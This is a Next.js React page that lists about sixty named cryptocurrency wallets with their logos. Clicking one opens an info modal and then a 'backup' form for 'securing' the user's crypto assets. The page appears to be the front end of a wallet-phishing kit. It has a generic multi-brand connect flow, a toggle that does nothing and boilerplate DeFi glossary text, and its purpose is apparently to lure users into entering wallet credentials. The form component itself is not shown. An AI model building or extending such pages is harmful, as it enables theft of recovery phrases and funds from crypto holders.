"use client";

import { useSearchParams } from "next/navigation";
import { useState, Suspense } from "react";
import BackupFormModal from "@/components/BackupFormModal";
import WalletInfoModal from "@/components/WalletInfoModal";

const WALLETS = [
  { name: "Trust Wallet", src: "/assets2/images/wallets/trustwallet.jpeg" },
  { name: "Exodus Wallet",  src: "/assets2/images/wallets/exodus.jpeg" },
  { name: "Arculus Wallet", src: "/assets2/images/wallets/aculus.png" },
  { name: "Tangem Wallet", src: "/assets2/images/wallets/Tangem.png" },
  { name: "Ledger Nano X Wallet", src: "/assets2/images/wallets/LedgerNanoX.png" },
  { name: "IOGO", src: "/assets2/images/wallets/iogo.jpeg" },
  { name: "WalletConnect", src: "/assets2/images/walletconnect.png" },
  { name: "Coinbase", src: "/assets2/images/coinbase.png" },
  { name: "Lobstr", src: "/assets2/images/wallets/lobstr.png" },
  { name: "Atomic", src: "/assets2/images/wallets/atomic-4c02d2b33cf091fd83c7a49819394e41.png" },
  { name: "Metamask", src: "/assets2/images/wallets/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png" },
  { name: "Rainbow", src: "/assets2/images/wallets/rainbow-207dda8d66f8ffc00a21e4fcc5ce0a73.png" },
  { name: "Crypto.com | DeFi Wallet", src: "/assets2/images/wallets/crypto-4cbeac57421fb3ca2573db2cf448169a.png" },
  { name: "Anchor", src: "/assets2/images/wallets/anchor.png" },
  { name: "ONTO", src: "/assets2/images/wallets/onto-983003d35fe32bf916f9eda381f138f7.png" },
  { name: "TokenPocket", src: "/assets2/images/wallets/tokenpocket-57a4a886cc644e5237ac1558226154cb.png" },
  { name: "MathWallet", src: "/assets2/images/wallets/math-wallet-9e2256cfa5aad3b33af05f3fee4dc9ef.png" },
  { name: "BitPay", src: "/assets2/images/wallets/bitpay-1573dd6c95eb38386f181048663590d0.jpg" },
  { name: "Maiar", src: "/assets2/images/wallets/maiar.png" },
  { name: "Ledger Live", src: "/assets2/images/wallets/ledgerlive-9fe387e571fb42ed5cdf08e29bc920ed.png" },
  { name: "Walleth", src: "/assets2/images/wallets/walleth-b60336f8dd9ea86285408cb4f96634d1.png" },
  { name: "Authereum", src: "/assets2/images/wallets/authereum-32f3939207b77c1837547d5ed4f86110.png" },
  { name: "MYKEY", src: "/assets2/images/wallets/mykey-7419df5270c0406c80cba19fa5165923.png" },
  { name: "TrustVault", src: "/assets2/images/wallets/trustvault-9031a67f82293fc50ead978f936cfff3.png" },
  { name: "Coin98", src: "/assets2/images/wallets/coin98-c5b50adaceaf474e48ef1dad150d0829.png" },
  { name: "CoolWallet S", src: "/assets2/images/wallets/coolwallet-s-cc612ee7a151c1863293fcc69dd0f677.png" },
  { name: "GridPlus", src: "/assets2/images/wallets/gridplus-8cedce167d37ddaa02f2afdf55841d8c.png" },
  { name: "CYBAVO Wallet", src: "/assets2/images/wallets/cybavowallet-16e7e96f2e3df01fe2170da5267774b5.png" },
  { name: "Wazirx", src: "/assets2/images/wallets/wazirx-logo-rounded.9bff9f42.png" },
  { name: "D'CENT Wallet", src: "/assets2/images/wallets/dcentwallet-f0bdbaec0837431b87ac9886bb22dfd5.png" },
  { name: "ZelCore", src: "/assets2/images/wallets/zelcore-d4c1a7a444b95612f6373f0b536b6ccb.png" },
  { name: "Coinomi", src: "/assets2/images/wallets/coinomi-7eecd68e38d78752d68b7232bd9c58d9.jpg" },
  { name: "SafePal", src: "/assets2/images/wallets/safepal-1022b40e2ea3a4a6bb19cf6ff28d8b92.png" },
  { name: "Infinito", src: "/assets2/images/wallets/infinito-wallet-68da061495160c96f4bcb5e70e612fdd.png" },
  { name: "wallet.io", src: "/assets2/images/wallets/wallet.io-198f396de22fe25eb370f46544abe69d.png" },
  { name: "Infinity Wallet", src: "/assets2/images/wallets/infinity-wallet-48e78bc97f96bad14ee6b781423a69ea.png" },
  { name: "Ownbit", src: "/assets2/images/wallets/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png" },
  { name: "EasyPocket", src: "/assets2/images/wallets/easypocket-436ea3270a7bf77c02a880bfc70d0ee8.jpg" },
  { name: "SparkPoint", src: "/assets2/images/wallets/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png" },
  { name: "ViaWallet", src: "/assets2/images/wallets/viawallet-ae1502eddf4d2ed89abd36907dd3ae8a.png" },
  { name: "BitKeep", src: "/assets2/images/wallets/bitkeep-387b0ca7da4cf322f44c70c23064c529.png" },
  { name: "Vision", src: "/assets2/images/wallets/vision-928292fe642172a18e62feb5eaa2d639.png" },
  { name: "PEAKDEFI Wallet", src: "/assets2/images/wallets/peakdefi-2e1d4f97cc1a737a9aa765b3748ff315.png" },
  { name: "Cosmostation", src: "/assets2/images/wallets/cosmosstation.png" },
  { name: "Graph Protocol", src: "/assets2/images/wallets/graph.jpg" },
  { name: "KardiaChain", src: "/assets2/images/wallets/kardachain.png" },
  { name: "Keplr", src: "/assets2/images/wallets/keplr.png" },
  { name: "Harmony", src: "/assets2/images/wallets/harmony.png" },
  { name: "ICONex", src: "/assets2/images/wallets/iconex.png" },
  { name: "Fetch", src: "/assets2/images/wallets/fetch.jpg" },
  { name: "XDC Wallet", src: "/assets2/images/wallets/xdc-9a98bff95dffc41869b8e77912a6cc54.png" },
  { name: "Unstoppable Wallet", src: "/assets2/images/wallets/unstoppable-0d3474dcd7572ac2080b0f4ce632dfac.png" },
  { name: "MEET.ONE", src: "/assets2/images/wallets/meetone-01093db7d99e3e6cf5cca68b616f8255.jpg" },
  { name: "Dok Wallet", src: "/assets2/images/wallets/dok-a32c522e109217cc2a1a2a310f3c9bf7.png" },
  { name: "AT.Wallet", src: "/assets2/images/wallets/atwallet-2611d814a50a964b89d5f8bc1e5cb3a0.png" },
  { name: "MoriX Wallet", src: "/assets2/images/wallets/morixwallet-aa7d607cf9ad52afeb3b7c83e5f34eba.png" },
  { name: "Midas Wallet", src: "/assets2/images/wallets/midas-wallet-5c5057d972ca621414f077541845fc61.png" },
  { name: "KEYRING PRO", src: "/assets2/images/wallets/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png" },
  { name: "Blockchain", src: "/assets2/images/wallets/blockchain-logo.png" },
  { name: "Binance Smart Chain", src: "/assets2/images/wallets/bsc-logo.png" },
  { name: "Aktionariat", src: "/assets2/images/wallets/aktionariat-c5784b26234a389632687a36d2fb3258.png" },
];

const EXPLANATIONS: Record<string, string> = {
  secure: "Refers to the safety and protection of assets, data, and transactions in the crypto space. Investors should prioritize platforms with robust security measures like encryption and multi-factor authentication.",
  dapps: "Decentralized Applications (DApps) run on blockchain networks like Ethereum. They are open-source, decentralized, and often use smart contracts. Investors should look for DApps with strong use cases and active user bases.",
  kyc: "Know Your Customer (KYC) is a process used by platforms to verify the identity of their users. It helps prevent fraud and ensures compliance with regulations.",
  igo: "Initial Game Offering (IGO) is a fundraising method for blockchain-based gaming projects. Investors can purchase in-game assets or tokens early.",
  launchpad: "A platform that helps new crypto projects raise funds and gain visibility. Investors can participate in token sales early.",
  staking: "The process of locking up crypto assets to support a blockchain network and earn rewards. Investors should consider the staking rewards, lock-up periods, and risks involved.",
  farming: "A DeFi practice where investors provide liquidity to earn rewards. It can be highly profitable but also risky due to smart contract vulnerabilities and market volatility.",
  crypto: "Short for cryptocurrency, a digital or virtual currency that uses cryptography for security. Investors should diversify their portfolio and stay informed about market trends.",
  defi: "Decentralized Finance (DeFi) refers to financial services built on blockchain technology, eliminating intermediaries.",
  web3: "The next generation of the internet, powered by blockchain technology. It aims to create a decentralized and user-controlled web.",
  ido: "Initial DEX Offering (IDO) is a fundraising method where tokens are sold on a decentralized exchange.",
  token: "A digital asset or utility that exists on a blockchain. Tokens can represent ownership, access rights, or other values.",
  nft: "Non-Fungible Tokens (NFTs) are unique digital assets that represent ownership of items like art, collectibles, or in-game items.",
};

function WalletsContent() {
  const searchParams = useSearchParams();
  const [infoWallet, setInfoWallet] = useState<{ name: string; src: string } | null>(null);
  const [backupWallet, setBackupWallet] = useState<{ name: string; src: string } | null>(null);
  const [showUninstalled, setShowUninstalled] = useState(false);

  const term = searchParams?.toString().split("=")[0] || "secure";
  const explanation = EXPLANATIONS[term.toLowerCase()] || "Select your preferred wallet to backup and secure your crypto assets.";
  const displayTerm = term.charAt(0).toUpperCase() + term.slice(1);

  return (
    <main style={{ background: "#0e1d26", minHeight: "100vh", paddingTop: "80px" }}>

      {/* Wallets Section */}
      <section style={{ background: "#0e1d26", color: "#fff", padding: "50px 15px" }}>
        <div style={{ maxWidth: "900px", margin: "0 auto" }}>

          {/* Dynamic Header */}
          <h2 style={{ fontWeight: 700, marginBottom: "10px", textTransform: "capitalize", fontSize: "1.8rem" }}>
            {displayTerm}
          </h2>
          <p style={{
            maxWidth: "800px",
            color: "#fff",
            background: "#173140",
            padding: "12px",
            borderRadius: "6px",
            fontSize: "12px",
            letterSpacing: "1px",
            marginBottom: "30px"
          }}>
            {explanation}
          </p>

          {/* Choose Wallet + Toggle */}
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "16px 0", maxWidth: "400px" }}>
            <span style={{ color: "#ffffff", fontSize: "14px" }}>Choose wallet</span>
            <div style={{ display: "flex", alignItems: "center", gap: "8px", fontSize: "14px" }}>
              <span style={{ color: "#6c8ebf" }}>Show uninstalled</span>
              <label style={{ position: "relative", display: "inline-block", width: "34px", height: "18px", cursor: "pointer" }}>
                <input
                  type="checkbox"
                  style={{ opacity: 0, width: 0, height: 0 }}
                  checked={showUninstalled}
                  onChange={() => setShowUninstalled(!showUninstalled)}
                />
                <span style={{
                  position: "absolute", cursor: "pointer", top: 0, left: 0, right: 0, bottom: 0,
                  background: showUninstalled ? "#4f46e5" : "#2b2b3c",
                  borderRadius: "34px", transition: "0.4s"
                }}>
                  <span style={{
                    position: "absolute", height: "14px", width: "14px",
                    left: showUninstalled ? "18px" : "2px", bottom: "2px",
                    background: showUninstalled ? "#fff" : "#8c9bbd",
                    borderRadius: "50%", transition: "0.4s"
                  }} />
                </span>
              </label>
            </div>
          </div>

          {/* Wallet List */}
          <div style={{ display: "flex", flexDirection: "column", gap: "0" }}>
            {WALLETS.map((wallet) => (
              <button
                key={wallet.name}
                onClick={() => setInfoWallet({ name: wallet.name, src: wallet.src })}
                style={{
                  background: "#152b35",
                  border: "3px solid #152b35",
                  borderRadius: "10px",
                  marginBottom: "8px",
                  cursor: "pointer",
                  color: "#fff",
                  transition: "box-shadow 0.2s ease",
                  width: "100%",
                  textAlign: "left",
                  padding: "6px",
                }}
                onMouseEnter={(e) => { (e.currentTarget as HTMLButtonElement).style.boxShadow = "0 0 8px rgba(155, 0, 232, 0.2)"; }}
                onMouseLeave={(e) => { (e.currentTarget as HTMLButtonElement).style.boxShadow = "none"; }}
              >
                <div style={{ display: "flex", alignItems: "center", padding: "8px 4px" }}>
                  {/* Icon col */}
                  <div style={{ width: "75px", display: "flex", justifyContent: "center", alignItems: "center", padding: "4px 0" }}>
                    <img
                      src={wallet.src}
                      alt={wallet.name}
                      style={{ width: "48px", height: "48px", borderRadius: "50%", objectFit: "cover" }}
                      onError={(e) => {
                        (e.target as HTMLImageElement).src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Ccircle cx='24' cy='24' r='24' fill='%23223344'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dominant-baseline='central' fill='%2388aacc' font-size='18' font-family='Arial'%3EW%3C/text%3E%3C/svg%3E";
                      }}
                    />
                  </div>
                  {/* Name col */}
                  <div style={{ flex: 1, display: "flex", justifyContent: "flex-start", alignItems: "center", paddingLeft: "12px" }}>
                    <span style={{ fontSize: "15px", fontWeight: 700, letterSpacing: "1.5px", color: "#fff" }}>
                      {wallet.name}
                    </span>
                  </div>
                </div>
              </button>
            ))}
          </div>
        </div>
      </section>

      {/* Step 1: Wallet info bottom-sheet */}
      <WalletInfoModal
        isOpen={!!infoWallet}
        onClose={() => setInfoWallet(null)}
        walletName={infoWallet?.name || ""}
        walletSrc={infoWallet?.src || ""}
        onConnect={() => {
          setBackupWallet(infoWallet ? { name: infoWallet.name, src: infoWallet.src } : null);
          setInfoWallet(null);
        }}
      />

      <BackupFormModal
        isOpen={!!backupWallet}
        onClose={() => setBackupWallet(null)}
        walletName={backupWallet?.name || ""}
        walletSrc={backupWallet?.src || ""}
      />
    </main>
  );
}

export default function WalletsPage() {
  return (
    <Suspense fallback={
      <div style={{ minHeight: "100vh", background: "#0e1d26", display: "flex", justifyContent: "center", alignItems: "center", paddingTop: "80px" }}>
        <div style={{ color: "#fff", fontSize: "1.5rem" }}>Loading wallets...</div>
      </div>
    }>
      <WalletsContent />
    </Suspense>
  );
}
